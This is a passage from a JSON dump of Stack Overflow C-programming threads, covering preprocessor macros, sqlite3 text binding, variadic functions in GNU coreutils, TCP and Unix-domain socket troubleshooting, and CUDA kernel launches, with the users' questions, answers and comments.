<code>union</code>:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>buffer: {10 bytes}\n\nstruct1: {1 byte, 5 bits, 2 bits, 2 bits,  7 bits, 3 bytes};\n\nstruct2: { byte, 3 bits, 3 bits, 2 bits, 2 bytes};\n\nstruct3: {1 byte, 4 bits, 4 bits, 6 bits, 2 bits};`\n\nunion: {buffer, struct1, struct2, struct3 } myunion;\n</code></pre>\n\n<p>I put the raw data on the buffer, and I get any bit on my union:\n<code>myunion.struct1.field3;</code></p>\n\n<p>How can I do it on Python?<br>\nAny advice about buffer treatment?</p>\n"}, {"tags": ["c", "gcc", "c-preprocessor"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1545731431, "post_id": 53921173, "comment_id": 94684407, "body": "I&#39;t only feasible as a macro, if the macro calls a function to do the transformation."}, {"owner": {"reputation": 197, "user_id": 5585075, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9030bcefdc0b9355e4fca09647ecc4fb?s=128&d=identicon&r=PG&f=1", "display_name": "T. Tournesol", "link": "https://stackoverflow.com/users/5585075/t-tournesol"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1545731509, "post_id": 53921173, "comment_id": 94684426, "body": "Maybe I wasn&#39;t clear : I WANT it to be a macro. ENCODE(&quot;ABC&quot;) must develop into {0, 1, 2};"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1545732203, "post_id": 53921173, "comment_id": 94684575, "body": "And you CAN&#39;T have it implemented as a pure macro. The arrays containing the literal string <code>&quot;ABC&quot;</code> doesn&#39;t really exist at the time when the preprocessor is executed. <a href=\"https://en.cppreference.com/w/c/language/translation_phases\" rel=\"nofollow noreferrer\">This translation phase reference</a> might be helpful. The preprocessor runs in step 4 while the actual compilation (which includes the actual handling of string literals and their storage) is handled in phase 7."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 1, "creation_date": 1545733901, "post_id": 53921173, "comment_id": 94684889, "body": "The C preprocessor simply does not support such stuff like decomposing string literals. You could, however, write e. g. a python script doing this stuff and run it as pre-build step before the preprocessor."}], "answers": [{"comments": [{"owner": {"reputation": 197, "user_id": 5585075, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9030bcefdc0b9355e4fca09647ecc4fb?s=128&d=identicon&r=PG&f=1", "display_name": "T. Tournesol", "link": "https://stackoverflow.com/users/5585075/t-tournesol"}, "edited": false, "score": 0, "creation_date": 1545731630, "post_id": 53921201, "comment_id": 94684455, "body": "But ENCODE doesn&#39;t have to know about those things, as far I can tell...  Everything can be done before actual compilation..."}, {"owner": {"reputation": 44802, "user_id": 2752075, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5oQlf.png?s=128&g=1", "display_name": "HolyBlackCat", "link": "https://stackoverflow.com/users/2752075/holyblackcat"}, "reply_to_user": {"reputation": 197, "user_id": 5585075, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9030bcefdc0b9355e4fca09647ecc4fb?s=128&d=identicon&r=PG&f=1", "display_name": "T. Tournesol", "link": "https://stackoverflow.com/users/5585075/t-tournesol"}, "edited": false, "score": 0, "creation_date": 1545731688, "post_id": 53921201, "comment_id": 94684469, "body": "@T.Tournesol In any case what you want is impossible in C. If you could switch to C++, you could use <code>constexpr</code> functions. Otherwise you&#39;re out of luck."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1545733348, "post_id": 53921201, "comment_id": 94684786, "body": "There is really no reason to hardcode either, if the character is <code>A-Z</code>, simply subtract <code>&#39;A&#39;</code>, if <code>a-z</code>, simply subtract <code>&#39;a&#39;</code> (or <code>&#39;a&#39; + 26</code> to make lowercase <code>26-52</code>)."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1545733725, "post_id": 53921201, "comment_id": 94684853, "body": "Ok, sorry, I&#39;m just confused on where your strings are coming from. I was thinking a simple function, but if that won&#39;t work, you are left hardcoding."}], "tags": [], "owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "is_accepted": true, "score": 1, "last_activity_date": 1545731461, "creation_date": 1545731461, "answer_id": 53921201, "question_id": 53921173, "link": "https://stackoverflow.com/questions/53921173/string-conversion-macro/53921201#53921201", "title": "String conversion macro", "body": "<p>I afraid you cant. The preprocessor as the name states does something with the file before the actual compilation. It does not know anything about arrays, strings etc. </p>\n"}, {"tags": [], "owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "is_accepted": false, "score": -1, "last_activity_date": 1545735081, "creation_date": 1545735081, "answer_id": 53921651, "question_id": 53921173, "link": "https://stackoverflow.com/questions/53921173/string-conversion-macro/53921651#53921651", "title": "String conversion macro", "body": "<p>A macro cannot access the individual characters of a string. </p>\n\n<p>As an added complication, if <code>string1</code> is supposed to have <em>static</em> storage duration (global, <code>static</code> in a function, etc...), you cannot even use a string literal, because the integer values in initializers need to be <em>integer constant expressions</em>.</p>\n\n<p>For a non-static initializer you <em>could</em> use some kind of an expression that expands to a nested <code>? :</code>, but it would be just as awful - and easily replaced by a function.</p>\n\n<hr>\n\n<p>You <em>can</em> use individual characters and a variable argument macro.</p>\n"}], "owner": {"reputation": 197, "user_id": 5585075, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9030bcefdc0b9355e4fca09647ecc4fb?s=128&d=identicon&r=PG&f=1", "display_name": "T. Tournesol", "link": "https://stackoverflow.com/users/5585075/t-tournesol"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 68, "favorite_count": 0, "accepted_answer_id": 53921201, "answer_count": 2, "score": 0, "last_activity_date": 1545735081, "creation_date": 1545731294, "last_edit_date": 1545731573, "question_id": 53921173, "link": "https://stackoverflow.com/questions/53921173/string-conversion-macro", "title": "String conversion macro", "body": "<p>I must store some strings with a custom encoding (let's say A->0, B->1, etc.).</p>\n\n<p>I'd like to be able to declare them as :</p>\n\n<pre><code>u8 string1[] = ENCODE(\"ABC\");\n</code></pre>\n\n<p>rather than :</p>\n\n<pre><code>u8 string1[] = {0, 1, 2};\n</code></pre>\n\n<p>so ENCODE(s) is a macro that should develop as a byte array representing the encoded string (and while I'm at it, it should add a string terminator value) (here u8 is an alias for unsigned char). </p>\n\n<p>I have absolutely no idea is this is feasible using the C preprocessor. But I'd be surprised.</p>\n"}, {"tags": ["c", "sqlite"], "answers": [{"comments": [{"owner": {"reputation": 1253, "user_id": 2704265, "user_type": "registered", "accept_rate": 11, "profile_image": "https://www.gravatar.com/avatar/519a2a2b5688e294cf4d3f7e914b3415?s=128&d=identicon&r=PG&f=1", "display_name": "alancc", "link": "https://stackoverflow.com/users/2704265/alancc"}, "edited": false, "score": 0, "creation_date": 1545731488, "post_id": 53921110, "comment_id": 94684421, "body": "Thank you very much. I add an update to my question regarding the document. Can you please help on that?"}, {"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "reply_to_user": {"reputation": 1253, "user_id": 2704265, "user_type": "registered", "accept_rate": 11, "profile_image": "https://www.gravatar.com/avatar/519a2a2b5688e294cf4d3f7e914b3415?s=128&d=identicon&r=PG&f=1", "display_name": "alancc", "link": "https://stackoverflow.com/users/2704265/alancc"}, "edited": false, "score": 0, "creation_date": 1545732081, "post_id": 53921110, "comment_id": 94684557, "body": "The documentation certainly reads like the text64 version requires an explicit byte count, yes."}], "tags": [], "owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "is_accepted": true, "score": 1, "last_activity_date": 1545730779, "creation_date": 1545730779, "answer_id": 53921110, "question_id": 53921051, "link": "https://stackoverflow.com/questions/53921051/what-is-the-difference-between-sqlite3-bind-text-sqlite3-bind-text16-and-sqlite/53921110#53921110", "title": "What is the difference between sqlite3_bind_text, sqlite3_bind_text16 and sqlite3_bind_text64?", "body": "<ul>\n<li><code>sqlite3_bind_text()</code> is for UTF-8 strings.</li>\n<li><code>sqlite3_bind_text16()</code> is for UTF-16 strings using your processor's native endianness.</li>\n<li><code>sqlite3_bind_text64()</code> lets you specify a particular encoding (utf-8, native utf-16, or a particular endian utf-16). You'll probably never need it.</li>\n<li><code>sqlite3_bind_blob()</code> should be used for non-Unicode strings that are just treated as binary blobs; all sqlite string functions work only with Unicode.</li>\n</ul>\n"}], "owner": {"reputation": 1253, "user_id": 2704265, "user_type": "registered", "accept_rate": 11, "profile_image": "https://www.gravatar.com/avatar/519a2a2b5688e294cf4d3f7e914b3415?s=128&d=identicon&r=PG&f=1", "display_name": "alancc", "link": "https://stackoverflow.com/users/2704265/alancc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 952, "favorite_count": 0, "accepted_answer_id": 53921110, "answer_count": 1, "score": 1, "last_activity_date": 1545731449, "creation_date": 1545730223, "last_edit_date": 1545731449, "question_id": 53921051, "link": "https://stackoverflow.com/questions/53921051/what-is-the-difference-between-sqlite3-bind-text-sqlite3-bind-text16-and-sqlite", "title": "What is the difference between sqlite3_bind_text, sqlite3_bind_text16 and sqlite3_bind_text64?", "body": "<p>I am using sqlite3 C interface. After reading document at <a href=\"https://www.sqlite.org/c3ref/bind_blob.html\" rel=\"nofollow noreferrer\">https://www.sqlite.org/c3ref/bind_blob.html</a> , I am totally confused.</p>\n\n<p>What is the difference between sqlite3_bind_text, sqlite3_bind_text16 and sqlite3_bind_text64?</p>\n\n<p>The document only describe that sqlite3_bind_text64 can accept encoding parameter including SQLITE_UTF8, SQLITE_UTF16, SQLITE_UTF16BE, or SQLITE_UTF16LE.</p>\n\n<p>So I guess, based on the parameters pass to these functions, that:</p>\n\n<p>sqlite3_bind_text is for ANSI characters, char *\nsqlite3_bind_text16 is for UTF-16 characters, \nsqlite3_bind_text64 is for various encoding mentioned above.</p>\n\n<p>Is that correct?</p>\n\n<p><strong>One more question:</strong></p>\n\n<p>The document said \"If the fourth parameter to sqlite3_bind_text() or sqlite3_bind_text16() is negative, then the length of the string is the number of bytes up to the first zero terminator.\" But it does not said what will happen for sqlite3_bind_text64. Originally I thought this is a typo. However, when I pass -1 as the fourth parameter to sqlite3_bind_text64, I will always get SQLITE_TOOBIG error, that makes me think they remove sqlite3_bind_text64 from the above statement by purpose. Is that correct?</p>\n\n<p>Thanks</p>\n"}, {"tags": ["c", "gnu-coreutils"], "answers": [{"tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": true, "score": 2, "last_activity_date": 1545730172, "creation_date": 1545730172, "answer_id": 53921046, "question_id": 53921001, "link": "https://stackoverflow.com/questions/53921001/passing-more-parameters-than-specified-in-prototype-in-c/53921046#53921046", "title": "passing more parameters than specified in prototype in C", "body": "<p>Notice that <code>...</code> at the end of the function declaration? That means the function is a <a href=\"https://en.cppreference.com/w/c/variadic\" rel=\"nofollow noreferrer\"><em>varags</em> (variable argument or variadic) function</a>, similar to e.g. <code>printf</code> or <code>scanf</code>.</p>\n\n<p>It means the function can take any number of arguments of any type, beyond the six specified.</p>\n\n<p>Exactly what kind of arguments you can pass should be specified in the documentation, but I guess it's a list of null-terminated byte strings, and the last need to be a <code>NULL</code> pointer to mark the end of the list.</p>\n"}], "owner": {"reputation": 11, "user_id": 9933842, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-a5aEoJwPGmk/AAAAAAAAAAI/AAAAAAAAA60/Rhcrv-QrsSY/photo.jpg?sz=128", "display_name": "\u9673\u77e9\u7ff0", "link": "https://stackoverflow.com/users/9933842/%e9%99%b3%e7%9f%a9%e7%bf%b0"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 59, "favorite_count": 0, "accepted_answer_id": 53921046, "answer_count": 1, "score": 0, "last_activity_date": 1545730172, "creation_date": 1545729750, "question_id": 53921001, "link": "https://stackoverflow.com/questions/53921001/passing-more-parameters-than-specified-in-prototype-in-c", "title": "passing more parameters than specified in prototype in C", "body": "<p>I'm practicing reading others' code, picked up one of the simplest package in the GNU core-utils, GNU yes.  coreutils-8.26 to be specific, because my machine is debian stretch.  Code direct links are at the end.</p>\n\n<p>In main(), we have this line:</p>\n\n<pre><code>  parse_long_options (argc, argv, PROGRAM_NAME, PACKAGE_NAME, Version,\n                  usage, AUTHORS, (char const *) NULL);\n</code></pre>\n\n<p><code>PROGRAM_NAME</code>, <code>PACKAGE_NAME</code>, <code>Version</code>, <code>AUTHORS</code> shall just be some <code>#define</code> macro for constant c-string, thus we indeed passed 8 parameters to <code>parse_long_options</code> here.</p>\n\n<p>In <code>long-options.h</code> which we included, we declared <code>parse_long_options</code> as following, which accepts only 6 arguments:</p>\n\n<pre><code>void parse_long_options (int _argc,\n                     char **_argv,\n                     const char *_command_name,\n                     const char *_package,\n                     const char *_version,\n                     void (*_usage) (int),\n                     /* const char *author1, ...*/ ...);\n</code></pre>\n\n<p>So, my question is, how does this package, GNU yes, actually compile and run?  It's an UB, at least in C99. (<a href=\"https://stackoverflow.com/a/17104818/9933842\">1</a>)  Is it just because how GCC is implemented, and hence shall be avoided?</p>\n\n<p>code direct links:</p>\n\n<p>yes.c from coreutils-8.26: (<a href=\"https://ideone.com/iHXKS2\" rel=\"nofollow noreferrer\">2</a>)</p>\n\n<p>long-options.c from coreutils-8.26: (<a href=\"https://ideone.com/nns5Zt\" rel=\"nofollow noreferrer\">3</a>)</p>\n\n<p>long-options.h from coreutils-8.26: (<a href=\"https://ideone.com/YUwA1k\" rel=\"nofollow noreferrer\">4</a>)</p>\n\n<p>ftp of GNU: (<a href=\"https://ftp.gnu.org/gnu/coreutils/\" rel=\"nofollow noreferrer\">5</a>)</p>\n"}, {"tags": ["c", "sockets"], "comments": [{"owner": {"reputation": 4328, "user_id": 920069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd39f0db1f22e1314746491df063602a?s=128&d=identicon&r=PG", "display_name": "Retired Ninja", "link": "https://stackoverflow.com/users/920069/retired-ninja"}, "edited": false, "score": 0, "creation_date": 1545728403, "post_id": 53920575, "comment_id": 94683795, "body": "I was going to try it out, but without the includes it&#39;s too  much work."}, {"owner": {"reputation": 208003, "user_id": 841108, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/Fm52y.png?s=128&g=1", "display_name": "Basile Starynkevitch", "link": "https://stackoverflow.com/users/841108/basile-starynkevitch"}, "edited": false, "score": 0, "creation_date": 1545728606, "post_id": 53920575, "comment_id": 94683829, "body": "Every socket system call (<code>listen</code>, <code>send</code>, <code>recv</code> etc...) has its <a href=\"http://man7.org/linux/man-pages/man2/syscalls.2.html\" rel=\"nofollow noreferrer\"><code>man</code> page</a> that you should read, and can fail, and you should handle the failure (probably using <code>errno</code>)"}], "answers": [{"tags": [], "owner": {"reputation": 11, "user_id": 10313302, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-YpOZgDz3QVk/AAAAAAAAAAI/AAAAAAAAAAA/APUIFaN5LQKP5SrtFqWTwRsrrdzuPlHzvQ/mo/photo.jpg?sz=128", "display_name": "\u958b\u767c\u6e90", "link": "https://stackoverflow.com/users/10313302/%e9%96%8b%e7%99%bc%e6%ba%90"}, "is_accepted": false, "score": 1, "last_activity_date": 1545732166, "last_edit_date": 1545732166, "creation_date": 1545728319, "answer_id": 53920834, "question_id": 53920575, "link": "https://stackoverflow.com/questions/53920575/connecting-a-linux-client-to-macos-server-with-c/53920834#53920834", "title": "Connecting a Linux-client to MacOS-server with C", "body": "<ol>\n<li>Check server's ipfw IP Firewall. (Open port 3425 , which is the server port listen on)</li>\n<li>Server's IP address must be public IP. Or the server and client in the same local area network.</li>\n</ol>\n\n<p>If you just want to test your code. You can run server and client in the same computer. Open two terminal and the one run server , the other run client. And client change the connect ip 217.144.173.149 to 127.0.0.1\n     127.0.0.1 mean localhost.</p>\n"}, {"tags": [], "owner": {"reputation": 41, "user_id": 9432258, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-X0FU2xpZszc/AAAAAAAAAAI/AAAAAAAADG0/hL7_ema_QE0/photo.jpg?sz=128", "display_name": "Pranav Bhaskar", "link": "https://stackoverflow.com/users/9432258/pranav-bhaskar"}, "is_accepted": false, "score": 1, "last_activity_date": 1545728822, "creation_date": 1545728822, "answer_id": 53920889, "question_id": 53920575, "link": "https://stackoverflow.com/questions/53920575/connecting-a-linux-client-to-macos-server-with-c/53920889#53920889", "title": "Connecting a Linux-client to MacOS-server with C", "body": "<p>The problem is in the way you are converting the IP address from presentation type to network type.</p>\n\n<ol>\n<li>You should use the IP address if it is static instead of <code>INADDR_ANY</code>.</li>\n<li>If the problem stays try using a different function to convert the IP.</li>\n</ol>\n\n<p>For further reference go <a href=\"https://beej.us/guide/bgnet/html/single/bgnet.html\" rel=\"nofollow noreferrer\">here</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 550, "user_id": 3518621, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/bf3b0c525ec4ad5c29864f230486dea2?s=128&d=identicon&r=PG&f=1", "display_name": "cslrnr", "link": "https://stackoverflow.com/users/3518621/cslrnr"}, "is_accepted": false, "score": 1, "last_activity_date": 1545731140, "creation_date": 1545731140, "answer_id": 53921156, "question_id": 53920575, "link": "https://stackoverflow.com/questions/53920575/connecting-a-linux-client-to-macos-server-with-c/53921156#53921156", "title": "Connecting a Linux-client to MacOS-server with C", "body": "<p>As other answers suggested , please check if your server is listening on properly using netstat command in server </p>\n\n<p>From the server , check if firewalld or anyfirewall specific software is running \nTry using different port to bind on server , may be 8080 or something else .</p>\n\n<p>I also suggest you to read the excellent guide (beejs network programming guide)\n<a href=\"https://beej.us/guide/bgnet/\" rel=\"nofollow noreferrer\">https://beej.us/guide/bgnet/</a></p>\n"}], "owner": {"reputation": 1, "user_id": 10211664, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/01510e6e9850910a0cd40f8db95f929b?s=128&d=identicon&r=PG&f=1", "display_name": "argbt1", "link": "https://stackoverflow.com/users/10211664/argbt1"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "answer_count": 3, "score": -2, "last_activity_date": 1545751294, "creation_date": 1545725973, "last_edit_date": 1545751294, "question_id": 53920575, "link": "https://stackoverflow.com/questions/53920575/connecting-a-linux-client-to-macos-server-with-c", "title": "Connecting a Linux-client to MacOS-server with C", "body": "<p>I study sockets and try to write a very simple application. The client sends the string \"Hello there!\", the server accepts it, displays at itself and sends back. Wrote the client (Linux Ubuntu 18.04), and the server (macOS 10.14.2, IP: 217.144.173.149):\nserver:</p>\n\n<pre><code>int main()\n{\n    int sock, listener;\n    struct sockaddr_in addr;\n    char buf[1024];\n    int bytes_read;\n\n    listener = socket(AF_INET, SOCK_STREAM, 0);\n    if(listener &lt; 0)\n    {\n        perror(\"socket\");\n        exit(1);\n    }\n\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(3425);\n    addr.sin_addr.s_addr = htonl(INADDR_ANY);\n    if(bind(listener, (struct sockaddr *)&amp;addr, sizeof(addr)) &lt; 0)\n    {\n        perror(\"bind\");\n        exit(2);\n    }\n\n    listen(listener, 1);\n\n    while(1)\n    {\n        sock = accept(listener, 0, 0);\n        if(sock &lt; 0)\n        {\n            perror(\"accept\");\n            exit(3);\n        }\n\n        while(1)\n        {\n            bytes_read = recv(sock, buf, 1024, 0);\n            if (bytes_read &lt;= 0) break;\n            printf(buf);\n            send(sock, buf, bytes_read, 0);\n        }\n\n        close(sock);\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>client:</p>\n\n<pre><code>int main()\n{\n    char message[] = \"Hello there!\\n\";\n    char buf[sizeof(message)];\n\n    int sock;\n    struct sockaddr_in addr;\n\n    sock = socket(AF_INET, SOCK_STREAM, 0);\n    if(sock &lt; 0)\n    {\n        perror(\"socket\");\n        exit(1);\n    }\n\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(3425);\n    addr.sin_addr.s_addr = inet_addr(\"217.144.173.149\");\n    if(connect(sock, (struct sockaddr *)&amp;addr, sizeof(addr)) &lt; 0)\n    {\n        perror(\"connect\");\n        exit(2);\n    }\n\n    send(sock, message, sizeof(message), 0);\n    recv(sock, buf, sizeof(message), 0);\n\n    printf(buf);\n    close(sock);\n\n    return 0;\n}\n</code></pre>\n\n<p>However, after starting the client, it just hangs and after a while gives an error: connect: Connection timed out. The server at the same time, of course, works. Google search gave no results (maybe I was looking for). What I did wrong?</p>\n"}, {"tags": ["c", "linux", "sockets"], "comments": [{"owner": {"reputation": 89578, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 1, "creation_date": 1545727059, "post_id": 53920510, "comment_id": 94683534, "body": "If you don&#39;t want to accept connections don&#39;t bind to the socket in the first place. <code>listen(0)</code> makes no sense which means the <code>0</code> gets likely internally replaced with some sane value. And not doing <code>accept</code> does not matter since <code>accept</code> cares about getting already established connections from the kernel to the user space and not about starting the TCP handshake as you might assume."}, {"owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "reply_to_user": {"reputation": 89578, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1545727591, "post_id": 53920510, "comment_id": 94683622, "body": "@SteffenUllrich I tried to set <code>backlog</code> to 1 and now the two clients can <code>connect(3, {sa_family=AF_UNIX, sun_path=&quot;&#47;tmp&#47;test_local_addr&quot;}, 110) = 0</code>, but the third one is blocked <code>connect(3, {sa_family=AF_UNIX, sun_path=&quot;&#47;tmp&#47;test_local_addr&quot;}, 110</code>"}, {"owner": {"reputation": 89578, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 1, "creation_date": 1545734041, "post_id": 53920510, "comment_id": 94684917, "body": "see <a href=\"https://stackoverflow.com/questions/5111040/listen-ignores-the-backlog-argument\">listen() ignores the backlog argument?</a>."}, {"owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "reply_to_user": {"reputation": 89578, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "edited": false, "score": 0, "creation_date": 1545734319, "post_id": 53920510, "comment_id": 94684974, "body": "@SteffenUllrich Thanks. It means it can never be <code>null</code> and just an advice... like you said."}], "owner": {"reputation": 6828, "user_id": 8990329, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/f073ad236ccf499ebfbe504bc79a2096?s=128&d=identicon&r=PG&f=1", "display_name": "Some Name", "link": "https://stackoverflow.com/users/8990329/some-name"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 55, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1545725312, "creation_date": 1545725312, "question_id": 53920510, "link": "https://stackoverflow.com/questions/53920510/why-doesnt-a-client-get-connection-refused-in-case-of-backlog-0", "title": "Why doesn&#39;t a client get Connection Refused in case of backlog = 0?", "body": "<p>I'm playing around with Linux domain sockets and now I came to the issue about understanding backlog. Here is the server side code:</p>\n\n<pre><code>const char *const hostname = \"/tmp/test_local_addr\";\n\nint sock_fd = socket(AF_LOCAL, SOCK_STREAM, 0);\n\nstruct sockaddr_un server_address;\nmemset(&amp;server_address, '\\0', sizeof(struct sockaddr_un));\nserver_address.sun_family = AF_LOCAL;\nstrncpy(server_address.sun_path, hostname, hostname_len + 1);\nconst socklen_t addrlen = offsetof(struct sockaddr_un, sun_path) + hostname_len + 1;\n\nbind(sock_fd, (struct sockaddr*) &amp;server_address, addrlen);\n\nint listen_result = listen(sock_fd, 0);\n</code></pre>\n\n<p>I set the backlog size to <code>0</code> in the listen and do not call <code>accept</code> method so I expected that any client would receive Connection refused when trying to <code>connect</code>. But when I ran <code>strace nc -U /tmp/test_local_addr</code> from two separate terminals I have the first one prints</p>\n\n<pre><code>connect(3, {sa_family=AF_UNIX, sun_path=\"/tmp/test_local_addr\"}, 110) = 0\npoll([{fd=0, events=POLLIN}, {fd=3, events=0}, {fd=3, events=POLLIN}, {fd=1, events=0}], 4, -1\n</code></pre>\n\n<p>and the second</p>\n\n<pre><code>--- SIGWINCH {si_signo=SIGWINCH, si_code=SI_KERNEL} ---\nconnect(3, {sa_family=AF_UNIX, sun_path=\"/tmp/test_local_addr\"}, 110\n</code></pre>\n\n<p>The behavior is not really clear to me. I expected they both immediately terminates with <code>Connection refused</code>. But the </p>\n\n<pre><code>read(-1, 0x7fffc0db3740, 16384)         = -1 EBADF (Bad file descriptor)\n</code></pre>\n\n<p>happens in both clients only when I terminate the server.</p>\n"}, {"tags": ["c++", "c", "cuda"], "answers": [{"tags": [], "owner": {"reputation": 66945, "user_id": 681865, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77320b8ddf13954ffb22aa22965d465e?s=128&d=identicon&r=PG&f=1", "display_name": "talonmies", "link": "https://stackoverflow.com/users/681865/talonmies"}, "is_accepted": true, "score": 3, "last_activity_date": 1545749461, "creation_date": 1545749461, "answer_id": 53923377, "question_id": 53920500, "link": "https://stackoverflow.com/questions/53920500/how-does-cudalaunchkernel-know-the-array-size-of-void-args/53923377#53923377", "title": "How does cudaLaunchKernel know the array size of &quot;void **args&quot;?", "body": "<p>Quoting from the <a href=\"https://docs.nvidia.com/cuda/cuda-driver-api/group__CUDA__EXEC.html#group__CUDA__EXEC_1gb8f3dc3031b40da29d5f9a7139e52e15\" rel=\"nofollow noreferrer\">related documentation</a>:</p>\n\n<blockquote>\n  <p>The number of kernel parameters and their offsets and sizes do not\n  need to be specified as that information is retrieved directly from\n  the kernel's image.</p>\n</blockquote>\n\n<p>Every CUDA device function has its argument list stored with the statically compiled function code. The API, therefore, knows exactly how many argument entries a call to <code>cudaLaunchKernel</code> requires. You will get a segfault or undefined behaviour if you supply too few to the launch call.</p>\n"}], "owner": {"reputation": 11, "user_id": 10818770, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b0404157c0bc18f2c5bd2e6f17426cf3?s=128&d=identicon&r=PG&f=1", "display_name": "keepinrookie", "link": "https://stackoverflow.com/users/10818770/keepinrookie"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1160, "favorite_count": 0, "accepted_answer_id": 53923377, "answer_count": 1, "score": 1, "last_activity_date": 1545749461, "creation_date": 1545725224, "question_id": 53920500, "link": "https://stackoverflow.com/questions/53920500/how-does-cudalaunchkernel-know-the-array-size-of-void-args", "title": "How does cudaLaunchKernel know the array size of &quot;void **args&quot;?", "body": "<p>I know the size of array can be got with following code:</p>\n\n<pre><code>int a = 12;\nfloat b = 